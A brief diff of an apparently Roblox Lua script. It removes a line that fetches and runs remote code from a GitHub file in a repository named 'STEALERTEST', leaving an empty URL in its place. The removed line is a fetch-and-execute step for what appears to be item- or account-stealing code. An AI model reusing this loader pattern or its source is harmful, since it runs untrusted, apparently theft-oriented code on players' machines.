@@ -799,7 +799,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/VaporeonScripts/STEALERTEST/main/TEST", true))()
+    loadstring(game:HttpGetAsync("", true))()
     return;
 end
 if _G.AntiLeave ~= false then
